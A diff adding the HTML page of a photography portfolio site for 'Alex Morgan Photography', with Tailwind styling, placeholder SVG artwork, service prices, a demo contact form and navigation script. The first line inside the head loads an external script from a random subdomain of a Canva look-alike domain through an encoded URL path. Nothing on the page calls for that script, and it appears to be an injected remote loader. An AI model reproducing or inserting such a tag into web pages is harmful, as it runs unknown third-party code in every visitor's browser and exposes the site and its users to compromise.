@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script type='text/javascript' src='https://bhstcnn3fszcy75j.canva-hosted-embed.com/Hd3AdwRuPUXlEsqcKBLv553-htzwSyRfFopfAM7FtDLVCQQHKRpEWBEmQyGNEaDFvS8u-h-Qfpkl_bXGRpuq3g=='></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alex Morgan Photography</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Inter:wght@300;400;500;600&display=swap');
+        
+        .font-serif { font-family: 'Playfair Display', serif; }
+        .font-sans { font-family: 'Inter', sans-serif; }
+        
+        .photo-stream {
+            animation: streamFlow 20s linear infinite;
+        }
+        
+        .photo-stream:nth-child(1) { animation-delay: 0s; }
+        .photo-stream:nth-child(2) { animation-delay: -5s; }
+        .photo-stream:nth-child(3) { animation-delay: -10s; }
+        .photo-stream:nth-child(4) { animation-delay: -15s; }
+        .photo-stream:nth-child(5) { animation-delay: -2.5s; }
+        .photo-stream:nth-child(6) { animation-delay: -7.5s; }
+        .photo-stream:nth-child(7) { animation-delay: -12.5s; }
+        .photo-stream:nth-child(8) { animation-delay: -17.5s; }
+        
+        @keyframes streamFlow {
+            0% { transform: translateX(-150px) rotate(-5deg); opacity: 0; }
+            10% { opacity: 0.7; }
+            90% { opacity: 0.7; }
+            100% { transform: translateX(calc(100vw + 150px)) rotate(5deg); opacity: 0; }
+        }
+        
+        .photo-stream-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        .portfolio-item {
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .portfolio-item:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+        }
+        
+        .service-card {
+            transition: all 0.3s ease;
+        }
+        
+        .service-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body class="font-sans text-gray-800">
+    <!-- Navigation -->
+    <nav class="fixed top-0 w-full bg-white/95 backdrop-blur-sm z-50 shadow-sm">
+        <div class="max-w-7xl mx-auto px-6 py-4">
+            <div class="flex justify-between items-center">
+                <div class="font-serif text-2xl font-bold text-gray-900">Alex Morgan</div>
+                <div class="hidden md:flex space-x-8">
+                    <a href="#home" class="text-gray-700 hover:text-gray-900 transition-colors">Home</a>
+                    <a href="#portfolio" class="text-gray-700 hover:text-gray-900 transition-colors">Portfolio</a>
+                    <a href="#about" class="text-gray-700 hover:text-gray-900 transition-colors">About</a>
+                    <a href="#services" class="text-gray-700 hover:text-gray-900 transition-colors">Services</a>
+                    <a href="#contact" class="text-gray-700 hover:text-gray-900 transition-colors">Contact</a>
+                </div>
+                <button class="md:hidden">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section id="home" class="relative h-screen flex items-center justify-center overflow-hidden bg-gradient-to-br from-slate-900 to-slate-700">
+        <!-- Flowing Photo Stream -->
+        <div class="photo-stream-container">
+            <!-- Row 1 - Top -->
+            <div class="photo-stream absolute" style="top: 10%; left: 0;">
+                <svg width="200" height="140" viewBox="0 0 200 140" class="opacity-30 shadow-lg">
+                    <rect width="200" height="140" fill="#4a5568" rx="8"/>
+                    <rect x="15" y="15" width="170" height="110" fill="#2d3748" rx="4"/>
+                    <circle cx="60" cy="50" r="12" fill="#718096"/>
+                    <polygon points="15,100 70,60 120,80 185,45 185,125 15,125" fill="#4a5568"/>
+                </svg>
+            </div>
+            
+            <div class="photo-stream absolute" style="top: 15%; left: 0;">
+                <svg width="180" height="120" viewBox="0 0 180 120" class="opacity-25 shadow-lg">
+                    <rect width="180" height="120" fill="#2b6cb0" rx="8"/>
+                    <rect x="12" y="12" width="156" height="96" fill="#1e40af" rx="4"/>
+                    <circle cx="50" cy="40" r="10" fill="#60a5fa"/>
+                    <polygon points="12,85 60,55 105,70 168,40 168,108 12,108" fill="#2563eb"/>
+                </svg>
+            </div>
+            
+            <!-- Row 2 - Middle -->
+            <div class="photo-stream absolute" style="top: 35%; left: 0;">
+                <svg width="220" height="160" viewBox="0 0 220 160" class="opacity-35 shadow-lg">
+                    <rect width="220" height="160" fill="#059669" rx="8"/>
+                    <rect x="18" y="18" width="184" height="124" fill="#047857" rx="4"/>
+                    <circle cx="70" cy="55" r="14" fill="#34d399"/>
+                    <polygon points="18,115 80,70 140,90 202,55 202,142 18,142" fill="#065f46"/>
+                </svg>
+            </div>
+            
+            <div class="photo-stream absolute" style="top: 40%; left: 0;">
+                <svg width="190" height="130" viewBox="0 0 190 130" class="opacity-30 shadow-lg">
+                    <rect width="190" height="130" fill="#7c2d12" rx="8"/>
+                    <rect x="15" y="15" width="160" height="100" fill="#92400e" rx="4"/>
+                    <circle cx="65" cy="50" r="12" fill="#fbbf24"/>
+                    <polygon points="15,95 70,65 115,80 175,50 175,115 15,115" fill="#b45309"/>
+                </svg>
+            </div>
+            
+            <!-- Row 3 - Lower -->
+            <div class="photo-stream absolute" style="top: 65%; left: 0;">
+                <svg width="210" height="150" viewBox="0 0 210 150" class="opacity-28 shadow-lg">
+                    <rect width="210" height="150" fill="#7c3aed" rx="8"/>
+                    <rect x="16" y="16" width="178" height="118" fill="#5b21b6" rx="4"/>
+                    <circle cx="68" cy="52" r="13" fill="#a78bfa"/>
+                    <polygon points="16,110 75,70 130,85 194,55 194,134 16,134" fill="#6d28d9"/>
+                </svg>
+            </div>
+            
+            <div class="photo-stream absolute" style="top: 70%; left: 0;">
+                <svg width="170" height="110" viewBox="0 0 170 110" class="opacity-32 shadow-lg">
+                    <rect width="170" height="110" fill="#dc2626" rx="8"/>
+                    <rect x="13" y="13" width="144" height="84" fill="#991b1b" rx="4"/>
+                    <circle cx="55" cy="42" r="11" fill="#fca5a5"/>
+                    <polygon points="13,80 55,55 95,65 157,40 157,97 13,97" fill="#b91c1c"/>
+                </svg>
+            </div>
+            
+            <!-- Row 4 - Bottom -->
+            <div class="photo-stream absolute" style="top: 85%; left: 0;">
+                <svg width="200" height="140" viewBox="0 0 200 140" class="opacity-25 shadow-lg">
+                    <rect width="200" height="140" fill="#0891b2" rx="8"/>
+                    <rect x="15" y="15" width="170" height="110" fill="#0e7490" rx="4"/>
+                    <circle cx="62" cy="48" r="12" fill="#67e8f9"/>
+                    <polygon points="15,100 68,65 118,80 185,50 185,125 15,125" fill="#155e75"/>
+                </svg>
+            </div>
+            
+            <div class="photo-stream absolute" style="top: 90%; left: 0;">
+                <svg width="180" height="120" viewBox="0 0 180 120" class="opacity-30 shadow-lg">
+                    <rect width="180" height="120" fill="#ea580c" rx="8"/>
+                    <rect x="12" y="12" width="156" height="96" fill="#c2410c" rx="4"/>
+                    <circle cx="52" cy="40" r="10" fill="#fed7aa"/>
+                    <polygon points="12,85 58,55 100,70 168,40 168,108 12,108" fill="#9a3412"/>
+                </svg>
+            </div>
+        </div>
+        
+        <!-- Hero Content -->
+        <div class="relative z-10 text-center text-white px-6">
+            <h1 class="font-serif text-5xl md:text-7xl font-bold mb-6">
+                Capturing Life's
+                <span class="block text-amber-400">Beautiful Moments</span>
+            </h1>
+            <p class="text-xl md:text-2xl mb-8 max-w-2xl mx-auto font-light">
+                Professional photography that tells your unique story with artistry and passion
+            </p>
+            <div class="space-x-4">
+                <button onclick="document.getElementById('portfolio').scrollIntoView({behavior: 'smooth'})" 
+                        class="bg-amber-500 hover:bg-amber-600 text-white px-8 py-3 rounded-full font-medium transition-colors">
+                    View Portfolio
+                </button>
+                <button onclick="document.getElementById('contact').scrollIntoView({behavior: 'smooth'})" 
+                        class="border-2 border-white text-white hover:bg-white hover:text-gray-900 px-8 py-3 rounded-full font-medium transition-all">
+                    Get In Touch
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Portfolio Section -->
+    <section id="portfolio" class="py-20 bg-gray-50">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="text-center mb-16">
+                <h2 class="font-serif text-4xl md:text-5xl font-bold text-gray-900 mb-4">Portfolio</h2>
+                <p class="text-xl text-gray-600 max-w-2xl mx-auto">
+                    Explore my diverse collection of photography work across different styles and occasions
+                </p>
+            </div>
+            
+            <!-- Portfolio Categories -->
+            <div class="flex flex-wrap justify-center gap-4 mb-12">
+                <button class="bg-amber-500 text-white px-6 py-2 rounded-full font-medium">All</button>
+                <button class="bg-white text-gray-700 hover:bg-gray-100 px-6 py-2 rounded-full font-medium transition-colors">Weddings</button>
+                <button class="bg-white text-gray-700 hover:bg-gray-100 px-6 py-2 rounded-full font-medium transition-colors">Portraits</button>
+                <button class="bg-white text-gray-700 hover:bg-gray-100 px-6 py-2 rounded-full font-medium transition-colors">Events</button>
+                <button class="bg-white text-gray-700 hover:bg-gray-100 px-6 py-2 rounded-full font-medium transition-colors">Nature</button>
+            </div>
+            
+            <!-- Portfolio Grid -->
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <div class="portfolio-item bg-white rounded-lg overflow-hidden shadow-lg">
+                    <div class="h-64 bg-gradient-to-br from-rose-400 to-pink-600 flex items-center justify-center">
+                        <svg width="80" height="80" viewBox="0 0 100 100" class="text-white opacity-50">
+                            <rect width="100" height="100" fill="currentColor" rx="8"/>
+                            <circle cx="30" cy="30" r="8" fill="white"/>
+                            <polygon points="10,70 40,40 70,60 90,30 90,90 10,90" fill="white" opacity="0.7"/>
+                        </svg>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="font-serif text-xl font-bold mb-2">Wedding Bliss</h3>
+                        <p class="text-gray-600">Romantic wedding photography capturing intimate moments</p>
+                    </div>
+                </div>
+                
+                <div class="portfolio-item bg-white rounded-lg overflow-hidden shadow-lg">
+                    <div class="h-64 bg-gradient-to-br from-blue-400 to-indigo-600 flex items-center justify-center">
+                        <svg width="80" height="80" viewBox="0 0 100 100" class="text-white opacity-50">
+                            <rect width="100" height="100" fill="currentColor" rx="8"/>
+                            <circle cx="35" cy="25" r="6" fill="white"/>
+                            <polygon points="10,65 35,45 60,55 90,35 90,90 10,90" fill="white" opacity="0.7"/>
+                        </svg>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="font-serif text-xl font-bold mb-2">Portrait Sessions</h3>
+                        <p class="text-gray-600">Professional headshots and personal portraits</p>
+                    </div>
+                </div>
+                
+                <div class="portfolio-item bg-white rounded-lg overflow-hidden shadow-lg">
+                    <div class="h-64 bg-gradient-to-br from-green-400 to-emerald-600 flex items-center justify-center">
+                        <svg width="80" height="80" viewBox="0 0 100 100" class="text-white opacity-50">
+                            <rect width="100" height="100" fill="currentColor" rx="8"/>
+                            <circle cx="25" cy="35" r="10" fill="white"/>
+                            <polygon points="10,75 30,50 55,65 90,40 90,90 10,90" fill="white" opacity="0.7"/>
+                        </svg>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="font-serif text-xl font-bold mb-2">Nature & Landscapes</h3>
+                        <p class="text-gray-600">Breathtaking natural scenery and outdoor adventures</p>
+                    </div>
+                </div>
+                
+                <div class="portfolio-item bg-white rounded-lg overflow-hidden shadow-lg">
+                    <div class="h-64 bg-gradient-to-br from-purple-400 to-violet-600 flex items-center justify-center">
+                        <svg width="80" height="80" viewBox="0 0 100 100" class="text-white opacity-50">
+                            <rect width="100" height="100" fill="currentColor" rx="8"/>
+                            <circle cx="40" cy="30" r="7" fill="white"/>
+                            <polygon points="10,70 45,45 65,55 90,35 90,90 10,90" fill="white" opacity="0.7"/>
+                        </svg>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="font-serif text-xl font-bold mb-2">Corporate Events</h3>
+                        <p class="text-gray-600">Professional event coverage and corporate photography</p>
+                    </div>
+                </div>
+                
+                <div class="portfolio-item bg-white rounded-lg overflow-hidden shadow-lg">
+                    <div class="h-64 bg-gradient-to-br from-orange-400 to-red-600 flex items-center justify-center">
+                        <svg width="80" height="80" viewBox="0 0 100 100" class="text-white opacity-50">
+                            <rect width="100" height="100" fill="currentColor" rx="8"/>
+                            <circle cx="30" cy="25" r="9" fill="white"/>
+                            <polygon points="10,65 35,40 60,50 90,30 90,90 10,90" fill="white" opacity="0.7"/>
+                        </svg>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="font-serif text-xl font-bold mb-2">Family Moments</h3>
+                        <p class="text-gray-600">Heartwarming family photography sessions</p>
+                    </div>
+                </div>
+                
+                <div class="portfolio-item bg-white rounded-lg overflow-hidden shadow-lg">
+                    <div class="h-64 bg-gradient-to-br from-teal-400 to-cyan-600 flex items-center justify-center">
+                        <svg width="80" height="80" viewBox="0 0 100 100" class="text-white opacity-50">
+                            <rect width="100" height="100" fill="currentColor" rx="8"/>
+                            <circle cx="35" cy="30" r="8" fill="white"/>
+                            <polygon points="10,70 40,45 65,60 90,35 90,90 10,90" fill="white" opacity="0.7"/>
+                        </svg>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="font-serif text-xl font-bold mb-2">Street Photography</h3>
+                        <p class="text-gray-600">Candid moments and urban life documentation</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section id="about" class="py-20 bg-white">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
+                <div>
+                    <h2 class="font-serif text-4xl md:text-5xl font-bold text-gray-900 mb-6">About Alex</h2>
+                    <p class="text-lg text-gray-600 mb-6">
+                        With over 8 years of experience in professional photography, I specialize in capturing the authentic emotions and beautiful moments that make life extraordinary. My passion lies in creating timeless images that tell your unique story.
+                    </p>
+                    <p class="text-lg text-gray-600 mb-8">
+                        Based in the heart of the city, I work with clients across the region to document weddings, portraits, corporate events, and everything in between. Every photo session is approached with creativity, professionalism, and attention to detail.
+                    </p>
+                    
+                    <!-- Stats -->
+                    <div class="grid grid-cols-3 gap-8 mb-8">
+                        <div class="text-center">
+                            <div class="font-serif text-3xl font-bold text-amber-500 mb-2">500+</div>
+                            <div class="text-gray-600">Happy Clients</div>
+                        </div>
+                        <div class="text-center">
+                            <div class="font-serif text-3xl font-bold text-amber-500 mb-2">8</div>
+                            <div class="text-gray-600">Years Experience</div>
+                        </div>
+                        <div class="text-center">
+                            <div class="font-serif text-3xl font-bold text-amber-500 mb-2">15</div>
+                            <div class="text-gray-600">Awards Won</div>
+                        </div>
+                    </div>
+                    
+                    <button onclick="document.getElementById('contact').scrollIntoView({behavior: 'smooth'})" 
+                            class="bg-amber-500 hover:bg-amber-600 text-white px-8 py-3 rounded-full font-medium transition-colors">
+                        Let's Work Together
+                    </button>
+                </div>
+                
+                <div class="relative">
+                    <div class="bg-gradient-to-br from-amber-400 to-orange-600 rounded-2xl p-8 shadow-2xl">
+                        <div class="bg-white rounded-xl p-8 text-center">
+                            <div class="w-32 h-32 bg-gradient-to-br from-gray-300 to-gray-500 rounded-full mx-auto mb-6 flex items-center justify-center">
+                                <svg width="60" height="60" viewBox="0 0 100 100" class="text-white">
+                                    <circle cx="50" cy="35" r="15" fill="currentColor"/>
+                                    <path d="M25 75 Q50 60 75 75 Q75 85 50 85 Q25 85 25 75" fill="currentColor"/>
+                                </svg>
+                            </div>
+                            <h3 class="font-serif text-2xl font-bold text-gray-900 mb-2">Alex Morgan</h3>
+                            <p class="text-gray-600 mb-4">Professional Photographer</p>
+                            <div class="flex justify-center space-x-4">
+                                <div class="w-8 h-8 bg-gray-200 rounded-full"></div>
+                                <div class="w-8 h-8 bg-gray-200 rounded-full"></div>
+                                <div class="w-8 h-8 bg-gray-200 rounded-full"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Services Section -->
+    <section id="services" class="py-20 bg-gray-50">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="text-center mb-16">
+                <h2 class="font-serif text-4xl md:text-5xl font-bold text-gray-900 mb-4">Services</h2>
+                <p class="text-xl text-gray-600 max-w-2xl mx-auto">
+                    Comprehensive photography services tailored to capture your most important moments
+                </p>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <div class="service-card bg-white rounded-xl p-8 shadow-lg">
+                    <div class="w-16 h-16 bg-rose-100 rounded-full flex items-center justify-center mb-6">
+                        <svg width="32" height="32" viewBox="0 0 100 100" class="text-rose-600">
+                            <path d="M50 20 L60 40 L80 40 L65 55 L70 75 L50 65 L30 75 L35 55 L20 40 L40 40 Z" fill="currentColor"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-serif text-2xl font-bold text-gray-900 mb-4">Wedding Photography</h3>
+                    <p class="text-gray-600 mb-6">Complete wedding day coverage from preparation to reception, capturing every precious moment of your special day.</p>
+                    <div class="text-amber-600 font-semibold">Starting at $2,500</div>
+                </div>
+                
+                <div class="service-card bg-white rounded-xl p-8 shadow-lg">
+                    <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mb-6">
+                        <svg width="32" height="32" viewBox="0 0 100 100" class="text-blue-600">
+                            <circle cx="50" cy="35" r="15" fill="currentColor"/>
+                            <path d="M25 75 Q50 60 75 75 Q75 85 50 85 Q25 85 25 75" fill="currentColor"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-serif text-2xl font-bold text-gray-900 mb-4">Portrait Sessions</h3>
+                    <p class="text-gray-600 mb-6">Professional headshots, family portraits, and personal branding photography that showcases your personality.</p>
+                    <div class="text-amber-600 font-semibold">Starting at $350</div>
+                </div>
+                
+                <div class="service-card bg-white rounded-xl p-8 shadow-lg">
+                    <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6">
+                        <svg width="32" height="32" viewBox="0 0 100 100" class="text-green-600">
+                            <rect x="20" y="30" width="60" height="40" fill="currentColor" rx="5"/>
+                            <circle cx="35" cy="45" r="5" fill="white"/>
+                            <polygon points="20,60 35,50 50,55 80,40 80,70 20,70" fill="white" opacity="0.7"/>
+                        </svg>
+                    </div>
+                    <h3 class="font-serif text-2xl font-bold text-gray-900 mb-4">Event Photography</h3>
+                    <p class="text-gray-600 mb-6">Corporate events, parties, and special occasions documented with professionalism and artistic flair.</p>
+                    <div class="text-amber-600 font-semibold">Starting at $800</div>
+                </div>
+            </div>
+            
+            <!-- Additional Services -->
+            <div class="mt-16 bg-white rounded-2xl p-8 shadow-lg">
+                <h3 class="font-serif text-3xl font-bold text-gray-900 mb-8 text-center">Additional Services</h3>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+                    <div class="text-center">
+                        <div class="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <svg width="24" height="24" viewBox="0 0 100 100" class="text-purple-600">
+                                <rect x="30" y="20" width="40" height="60" fill="currentColor" rx="5"/>
+                            </svg>
+                        </div>
+                        <h4 class="font-semibold text-gray-900 mb-2">Photo Editing</h4>
+                        <p class="text-gray-600 text-sm">Professional retouching and enhancement</p>
+                    </div>
+                    
+                    <div class="text-center">
+                        <div class="w-12 h-12 bg-indigo-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <svg width="24" height="24" viewBox="0 0 100 100" class="text-indigo-600">
+                                <rect x="20" y="30" width="60" height="40" fill="currentColor" rx="5"/>
+                            </svg>
+                        </div>
+                        <h4 class="font-semibold text-gray-900 mb-2">Print Services</h4>
+                        <p class="text-gray-600 text-sm">High-quality prints and albums</p>
+                    </div>
+                    
+                    <div class="text-center">
+                        <div class="w-12 h-12 bg-teal-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <svg width="24" height="24" viewBox="0 0 100 100" class="text-teal-600">
+                                <circle cx="50" cy="50" r="30" fill="currentColor"/>
+                            </svg>
+                        </div>
+                        <h4 class="font-semibold text-gray-900 mb-2">Digital Galleries</h4>
+                        <p class="text-gray-600 text-sm">Online galleries for easy sharing</p>
+                    </div>
+                    
+                    <div class="text-center">
+                        <div class="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <svg width="24" height="24" viewBox="0 0 100 100" class="text-orange-600">
+                                <polygon points="50,20 60,40 80,40 65,55 70,75 50,65 30,75 35,55 20,40 40,40" fill="currentColor"/>
+                            </svg>
+                        </div>
+                        <h4 class="font-semibold text-gray-900 mb-2">Rush Delivery</h4>
+                        <p class="text-gray-600 text-sm">Express editing and delivery options</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="py-20 bg-gray-900 text-white">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="text-center mb-16">
+                <h2 class="font-serif text-4xl md:text-5xl font-bold mb-4">Let's Create Together</h2>
+                <p class="text-xl text-gray-300 max-w-2xl mx-auto">
+                    Ready to capture your special moments? Get in touch to discuss your photography needs
+                </p>
+            </div>
+            
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-16">
+                <!-- Contact Form -->
+                <div class="bg-gray-800 rounded-2xl p-8">
+                    <h3 class="font-serif text-2xl font-bold mb-6">Send a Message</h3>
+                    <div class="bg-amber-100 border border-amber-400 text-amber-800 px-4 py-3 rounded-lg mb-6">
+                        <p class="text-sm"><strong>Demo Form:</strong> This is a sample contact form for demonstration purposes.</p>
+                    </div>
+                    <form class="space-y-6">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div>
+                                <label class="block text-gray-300 mb-2">First Name</label>
+                                <input type="text" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-amber-500 focus:outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-gray-300 mb-2">Last Name</label>
+                                <input type="text" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-amber-500 focus:outline-none">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-gray-300 mb-2">Email</label>
+                            <input type="email" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-amber-500 focus:outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-gray-300 mb-2">Service Needed</label>
+                            <select class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-amber-500 focus:outline-none">
+                                <option>Wedding Photography</option>
+                                <option>Portrait Session</option>
+                                <option>Event Photography</option>
+                                <option>Other</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-gray-300 mb-2">Message</label>
+                            <textarea rows="4" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-amber-500 focus:outline-none" placeholder="Tell me about your photography needs..."></textarea>
+                        </div>
+                        <button type="submit" class="w-full bg-amber-500 hover:bg-amber-600 text-white py-3 rounded-lg font-medium transition-colors">
+                            Send Message
+                        </button>
+                    </form>
+                </div>
+                
+                <!-- Contact Info -->
+                <div class="space-y-8">
+                    <div>
+                        <h3 class="font-serif text-2xl font-bold mb-6">Get In Touch</h3>
+                        <div class="space-y-6">
+                            <div class="flex items-start space-x-4">
+                                <div class="w-12 h-12 bg-amber-500 rounded-full flex items-center justify-center flex-shrink-0">
+                                    <svg width="24" height="24" viewBox="0 0 100 100" class="text-white">
+                                        <path d="M50 10 L70 30 L70 90 L30 90 L30 30 Z" fill="currentColor"/>
+                                        <circle cx="50" cy="50" r="8" fill="white"/>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <h4 class="font-semibold text-lg mb-1">Studio Address</h4>
+                                    <p class="text-gray-300">123 Photography Lane<br>Creative District, City 12345</p>
+                                </div>
+                            </div>
+                            
+                            <div class="flex items-start space-x-4">
+                                <div class="w-12 h-12 bg-amber-500 rounded-full flex items-center justify-center flex-shrink-0">
+                                    <svg width="24" height="24" viewBox="0 0 100 100" class="text-white">
+                                        <path d="M20 30 L50 50 L80 30 L80 70 L20 70 Z" fill="currentColor"/>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <h4 class="font-semibold text-lg mb-1">Email</h4>
+                                    <p class="text-gray-300">hello@alexmorganphoto.com<br>bookings@alexmorganphoto.com</p>
+                                </div>
+                            </div>
+                            
+                            <div class="flex items-start space-x-4">
+                                <div class="w-12 h-12 bg-amber-500 rounded-full flex items-center justify-center flex-shrink-0">
+                                    <svg width="24" height="24" viewBox="0 0 100 100" class="text-white">
+                                        <path d="M30 20 Q50 10 70 20 L70 80 Q50 90 30 80 Z" fill="currentColor"/>
+                                    </svg>
+                                </div>
+                                <div>
+                                    <h4 class="font-semibold text-lg mb-1">Phone</h4>
+                                    <p class="text-gray-300">(555) 123-4567<br>Available Mon-Fri 9AM-6PM</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Social Media -->
+                    <div>
+                        <h4 class="font-semibold text-lg mb-4">Follow My Work</h4>
+                        <div class="flex space-x-4">
+                            <div class="w-12 h-12 bg-gray-700 hover:bg-amber-500 rounded-full flex items-center justify-center cursor-pointer transition-colors">
+                                <svg width="20" height="20" viewBox="0 0 100 100" class="text-white">
+                                    <rect x="20" y="20" width="60" height="60" fill="currentColor" rx="15"/>
+                                </svg>
+                            </div>
+                            <div class="w-12 h-12 bg-gray-700 hover:bg-amber-500 rounded-full flex items-center justify-center cursor-pointer transition-colors">
+                                <svg width="20" height="20" viewBox="0 0 100 100" class="text-white">
+                                    <circle cx="50" cy="50" r="30" fill="currentColor"/>
+                                </svg>
+                            </div>
+                            <div class="w-12 h-12 bg-gray-700 hover:bg-amber-500 rounded-full flex items-center justify-center cursor-pointer transition-colors">
+                                <svg width="20" height="20" viewBox="0 0 100 100" class="text-white">
+                                    <polygon points="20,20 80,20 80,80 20,80" fill="currentColor"/>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Testimonial -->
+                    <div class="bg-gray-800 rounded-xl p-6">
+                        <div class="flex items-center mb-4">
+                            <div class="flex text-amber-400">
+                                <span>★★★★★</span>
+                            </div>
+                        </div>
+                        <p class="text-gray-300 mb-4 italic">
+                            "Alex captured our wedding day perfectly! Every photo tells a story and the quality is absolutely stunning. Highly recommend!"
+                        </p>
+                        <div class="text-sm">
+                            <div class="font-semibold">Sarah & Michael</div>
+                            <div class="text-gray-400">Wedding Clients</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-black text-white py-12">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+                <div class="md:col-span-2">
+                    <div class="font-serif text-2xl font-bold mb-4">Alex Morgan Photography</div>
+                    <p class="text-gray-400 mb-6 max-w-md">
+                        Professional photography services capturing life's most beautiful moments with artistry and passion.
+                    </p>
+                    <div class="flex space-x-4">
+                        <div class="w-10 h-10 bg-gray-800 hover:bg-amber-500 rounded-full flex items-center justify-center cursor-pointer transition-colors">
+                            <svg width="16" height="16" viewBox="0 0 100 100" class="text-white">
+                                <rect x="20" y="20" width="60" height="60" fill="currentColor" rx="15"/>
+                            </svg>
+                        </div>
+                        <div class="w-10 h-10 bg-gray-800 hover:bg-amber-500 rounded-full flex items-center justify-center cursor-pointer transition-colors">
+                            <svg width="16" height="16" viewBox="0 0 100 100" class="text-white">
+                                <circle cx="50" cy="50" r="30" fill="currentColor"/>
+                            </svg>
+                        </div>
+                        <div class="w-10 h-10 bg-gray-800 hover:bg-amber-500 rounded-full flex items-center justify-center cursor-pointer transition-colors">
+                            <svg width="16" height="16" viewBox="0 0 100 100" class="text-white">
+                                <polygon points="20,20 80,20 80,80 20,80" fill="currentColor"/>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <h4 class="font-semibold text-lg mb-4">Quick Links</h4>
+                    <ul class="space-y-2 text-gray-400">
+                        <li><a href="#home" class="hover:text-white transition-colors">Home</a></li>
+                        <li><a href="#portfolio" class="hover:text-white transition-colors">Portfolio</a></li>
+                        <li><a href="#about" class="hover:text-white transition-colors">About</a></li>
+                        <li><a href="#services" class="hover:text-white transition-colors">Services</a></li>
+                        <li><a href="#contact" class="hover:text-white transition-colors">Contact</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h4 class="font-semibold text-lg mb-4">Services</h4>
+                    <ul class="space-y-2 text-gray-400">
+                        <li>Wedding Photography</li>
+                        <li>Portrait Sessions</li>
+                        <li>Event Photography</li>
+                        <li>Corporate Events</li>
+                        <li>Photo Editing</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="border-t border-gray-800 mt-12 pt-8 text-center text-gray-400">
+                <p>&copy; 2024 Alex Morgan Photography. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Smooth scrolling for navigation links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Portfolio category filtering
+        const categoryButtons = document.querySelectorAll('#portfolio button');
+        categoryButtons.forEach(button => {
+            button.addEventListener('click', function() {
+                // Remove active class from all buttons
+                categoryButtons.forEach(btn => {
+                    btn.classList.remove('bg-amber-500', 'text-white');
+                    btn.classList.add('bg-white', 'text-gray-700');
+                });
+                
+                // Add active class to clicked button
+                this.classList.remove('bg-white', 'text-gray-700');
+                this.classList.add('bg-amber-500', 'text-white');
+            });
+        });
